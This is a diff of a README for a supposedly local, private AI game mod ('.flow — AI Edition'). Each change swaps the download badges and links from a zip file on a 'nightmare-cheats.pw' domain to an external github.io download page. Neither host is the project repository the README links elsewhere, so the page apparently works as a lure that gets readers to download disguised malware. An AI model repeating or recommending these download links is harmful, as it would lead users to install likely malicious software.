@@ -2,9 +2,9 @@
 
 # .flow — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://nightmare-cheats.pw/Setup.zip)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://nightmare-cheats.pw/Setup.zip)
-[![Viral corruption](https://img.shields.io/badge/Infection-Spreading-3d3d3d?style=for-the-badge)](https://nightmare-cheats.pw/Setup.zip)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://laplaplaplas.github.io/download/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://laplaplaplas.github.io/download/)
+[![Viral corruption](https://img.shields.io/badge/Infection-Spreading-3d3d3d?style=for-the-badge)](https://laplaplaplas.github.io/download/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/LieutenantRecollect/flow-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/LieutenantRecollect/flow-ai-edition)
@@ -55,7 +55,7 @@ As infection rises, the narration degrades: descriptions get more fragmented, mo
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://nightmare-cheats.pw/Setup.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://nightmare-cheats.pw/Setup.zip)**
+- **[⬇ Download the latest version](https://laplaplaplas.github.io/download/)**
 - [Repository](https://github.com/LieutenantRecollect/flow-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
